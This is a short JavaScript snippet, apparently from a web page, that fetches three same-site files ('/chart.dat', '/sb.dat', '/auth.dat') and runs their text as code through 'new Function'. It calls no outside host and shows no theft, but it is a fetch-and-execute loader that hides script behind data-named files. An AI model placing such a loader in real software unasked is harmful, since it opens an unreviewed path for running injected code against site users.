(async function(){
  async function load(url){var r=await fetch(url);var t=await r.text();(new Function(t))();}
  await load('/chart.dat');
  await load('/sb.dat');
  await load('/auth.dat');
})();
